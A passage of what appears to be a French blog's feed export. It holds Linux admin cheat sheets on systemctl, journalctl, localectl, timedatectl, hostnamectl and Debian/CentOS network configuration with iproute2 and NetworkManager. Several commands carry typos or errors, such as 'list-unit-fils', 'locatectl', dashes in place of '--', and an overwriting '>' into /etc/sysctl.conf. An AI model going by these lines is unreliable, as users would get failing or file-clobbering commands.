&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lister les cibles ou services actifs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units -–type target
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units –-type service

&lt;span class=&quot;c&quot;&gt;# afficher toutes les cibles ou services&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units -–type target –all
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units –-type service –all

&lt;span class=&quot;c&quot;&gt;# afficher une liste complète&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-unit-fils –-type target/service
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-unit-fils –-type service

&lt;span class=&quot;c&quot;&gt;# gérer un service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl start sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl stop sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl reload sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl disable sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl is-enabled sshd

&lt;span class=&quot;c&quot;&gt;# afficher les dépendances d’une unité&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-dependencies –-before ssh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-dependencies –-after ssh

&lt;span class=&quot;c&quot;&gt;# gérer la machine&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl halt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl poweroff
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl reboot
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl shutdown

&lt;span class=&quot;c&quot;&gt;# Masquage&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# un service désactivé (disabled) et stoppé, peut tout de même tourner car il peut être issu d’une dépendance. On peut interdire ce comportement avec :&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl mask sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl unmask sshd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;systemd-family&quot;&gt;systemd family&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# logs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;journalctl
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;journalctl &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# follow&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;journalctl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; apache2 &lt;span class=&quot;c&quot;&gt;# specific service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;journalctl &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; apache2
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;logger &lt;span class=&quot;s1&quot;&gt;'yolo'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# envoyer un log&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# network&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;networkctl &lt;span class=&quot;c&quot;&gt;# lol&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# locales&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl status
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl list-loacles
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl set-locale fr_FR.utf8
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl list-keymaps
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locatectl set-keymap
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl list-x11-keymap-XXX
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;localectl set-x11-keymap fr
&lt;span class=&quot;nv&quot;&gt;$ LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fr_FR.UTF-8 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# date en time&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;timedatectl status
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;timedatectl set-time &lt;span class=&quot;s1&quot;&gt;'20:20'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;timedatectl list-timezones
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;timedatectl set-timezone Europe/London
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;timedatectl set-ntp TRUE/FALSE
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status systemd-timesyncd &lt;span class=&quot;c&quot;&gt;# use this service for ntp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/systemd/timesyncd
...
&lt;span class=&quot;nv&quot;&gt;NTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fr.pool.ntp.org
...
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart systemd-timesyncd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# hostname&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hostnamectl status
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hostnamectl set-hostname vm-debian
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hostnamectl set-location &lt;span class=&quot;s1&quot;&gt;'Room 110'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hostnamectl set-chassis &lt;span class=&quot;s1&quot;&gt;'3'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hostnamectl set-deployement &lt;span class=&quot;s1&quot;&gt;'PRE-PROD'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>network on linux</title>
   <link href="http://localhost:4000/linux/network/2018/02/15/network-on-linux/"/>
   <updated>2018-02-15T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/network/2018/02/15/network-on-linux</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;ifconfig&quot;&gt;ifconfig&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Historiquement, c’était la commande « &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; » qui était utilisée, cette commande à des inconvénients. Elle est peu précise et l’affichage des informations peut varier selon les distributions. Il est donc difficile par exemple de récupérer les IP par des scripts shells pour pouvoir les utiliser dans un programme. Cette commande est peu à peu remplacée par la commande « &lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt; » (provient de &lt;strong&gt;iproute2&lt;/strong&gt;).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;historic-names&quot;&gt;historic names&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Historiquement, on utilisait &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;eth1&lt;/code&gt;, …, &lt;code class=&quot;highlighter-rouge&quot;&gt;ethX&lt;/code&gt;, ou le X est l’ordre de détection par la machine au démarrage. Cela peut poser un problème si cet ordre est amené à changer. Pour résoudre en partie ce problème Debian associe lors de la première connexions l’adresse MAC de la carte avec son ethX. Mais ce n’était pas suffisant.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;predictable-names&quot;&gt;predictable names&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Nom basé sur l’emplacement physique de la carte réseau dans la machine et non plus sur l’ordre de détection. Le format &lt;code class=&quot;highlighter-rouge&quot;&gt;ethX&lt;/code&gt; est remplacé par &lt;code class=&quot;highlighter-rouge&quot;&gt;enpXsY&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;wlpXsY&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt; le numéro du port PCI de la carte réseau&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Y&lt;/code&gt; le numéro de slot&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ex: enp0s5&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;en -&amp;gt; carte type Ethernet (wl : carte wifi)&lt;/li&gt;
    &lt;li&gt;p0 -&amp;gt; port PCI 0&lt;/li&gt;
    &lt;li&gt;s3 -&amp;gt; slot 5&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lspci &lt;span class=&quot;c&quot;&gt;# affiche ce qui est sur le bus PCI&lt;/span&gt;
...
00:05.0 Ethernet controller: Red Hat, Inc Virtio network device
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00:05.0
  00 -&amp;gt; signifie que le port PCI est le numéro 0
  05 -&amp;gt; signifie que le  slot PCI est le numéro 5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;iproute2&quot;&gt;iproute2&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Docummentation sur &lt;a href=&quot;https://baturin.org/docs/iproute2/&quot;&gt;iproute2&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# affiche les interfaces&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip address show
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip address show eth0

&lt;span class=&quot;c&quot;&gt;# configurer une interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip address add 10.10.10.11/24 dev eth0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip address del 10.10.10.11/24 dev eth0

&lt;span class=&quot;c&quot;&gt;# activer/désactiver une interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 up
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 down

&lt;span class=&quot;c&quot;&gt;# États d’une interface&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# UP : est configurée et activée (pas forcement d’adresse, car il peut exister délai avec DHCP)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# LOWER_UP : UP + branchée physiquement pour communiquer&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# state UP:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# state DOWN: désactivé&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# afficher table de routage&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip route show

&lt;span class=&quot;c&quot;&gt;# gérer les routes&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip route add 10.10.10.0/24 via 192.168.0.1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip route del 10.10.10.0/24

&lt;span class=&quot;c&quot;&gt;# activer mode routeur (routage des paquets qui ne sont pas destinés à la machine)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;sysctl net.ipv4.ip_forward&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# ou&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sys/net/ipv4/ip_forward
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;sysctl net.ipv4.conf.eth0.forwarding&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;c&quot;&gt;# interface spécifique&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;net.ipv4.ip_forward=1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf &lt;span class=&quot;c&quot;&gt;# rendre persistant&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;persistent-routes&quot;&gt;persistent routes&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;debian&quot;&gt;Debian&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ajouter directives dans la configuration de l'interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/network/interfaces
...
&lt;span class=&quot;c&quot;&gt;#auto eth0&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#iface eth0 inet static&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#	address 10.10.10.1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#	netmask 255.255.255.0&lt;/span&gt;
	post-up ip route add 10.0.2.0/24 via 192.168.10.253
	pre-down ip route del 10.0.2.0/24
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;centos&quot;&gt;CentOS&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# il faut créer un fichier avec les routes à persister&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/sysconfig/netword-scripts
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo touch &lt;/span&gt;route-eth0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;192.168.10.0/24 via 10.0.2.253&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; route-eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;dynamic-configuration&quot;&gt;dynamic configuration&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Lorsqu’une carte réseau ne connaît pas ses paramètres réseau, elle interroge le réseau (DHCP) pour cela. On parle de configuration « dynamic » au sens ou l’on reçoit les paramètres dynamiquement par le réseau, cela ne signifie pas forcément que l’adresse est dynamique, configurer DHCP pour cela.&lt;/p&gt;

&lt;h4 id=&quot;debian-1&quot;&gt;Debian&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/network/interfaces

auto eth0 &lt;span class=&quot;c&quot;&gt;# on active l'interface à chaque boot&lt;/span&gt;
iface eth0 inet dhcp &lt;span class=&quot;c&quot;&gt;# doit utiliser DHCP pour auto-configuration&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart networking
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;centos-1&quot;&gt;CentOS&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/sysconfig/network-scripts/ipcfg-enp0s3

&lt;span class=&quot;nv&quot;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dhcp&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# on va utiliser DHCP&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;DEFROUTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# cette route contient la route par défaut&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PEERDNS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# recevoir des données DNS par le serveur DHCP&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PEERROUTES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# précédent mais pour des informations de routage&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;enp0s3&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# nom de l'interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ID unique de l'interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;DEVICE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;enp0s3&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# DOIT CORRESPONDRE AU NOM DU FIHICER ET À CELUI DE L'INTERFACE&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ONBOOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# demarrage au boot de la machine&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart network
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;static-configuration&quot;&gt;static configuration&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;debian-2&quot;&gt;Debian&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/network/interfaces

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
	address 10.0.2.101
	netmask 255.255.255.0
	gateway 10.0.2.1

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart networking
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;centos-2&quot;&gt;CentOS&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/sysconfig/ipcfg-enp0s3

&lt;span class=&quot;nv&quot;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;static &lt;span class=&quot;c&quot;&gt;# ou no&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# PEERDNS et PEERROUTEs : on supprimer car plus de DHCP&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;IPADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.2.100
&lt;span class=&quot;nv&quot;&gt;NETMASK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;255.255.255.0
&lt;span class=&quot;nv&quot;&gt;GATEWAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.2.1
&lt;span class=&quot;nv&quot;&gt;HOSTNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vm-web-centos
&lt;span class=&quot;nv&quot;&gt;NM_CONTROLLED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no &lt;span class=&quot;c&quot;&gt;# dire au networkmanager qu’on prend le contrôle&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ONBOOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart network 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;networkmanager&quot;&gt;NetworkManager&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Permet de gérer les interfaces sans être administrateur. On peut trouver de la documentation &lt;a href=&quot;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/&quot; target=&quot;_blank&quot;&gt;ici&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# status&lt;/span&gt;
systemctl status NetworkManager
systemctl restart NetworkManager

&lt;span class=&quot;c&quot;&gt;# network manager command line&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmcli

&lt;span class=&quot;c&quot;&gt;# mode graphique&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmtui

&lt;span class=&quot;c&quot;&gt;# afficher l'état&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmcli device
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;debug&quot;&gt;debug&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ping 192.168.1.12
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;traceroute 192.168.1.12
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mtr –n 192.168.1.12 &lt;span class=&quot;c&quot;&gt;# ping en continu et en live&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Informations sur les interfaces &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ethtool 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ethtool eth0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mii-tools

&lt;span class=&quot;c&quot;&gt;# Analyse de paquets&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0

&lt;span class=&quot;c&quot;&gt;# Test de débit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /dev/null http://ipv4.online-dc3.testdebit.info/5G.iso

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsof &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; :80
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsof &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; :https
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>vim</title>
   <link href="http://localhost:4000/linux/2018/01/22/vim/"/>
   <updated>2018-01-22T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2018/01/22/vim</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
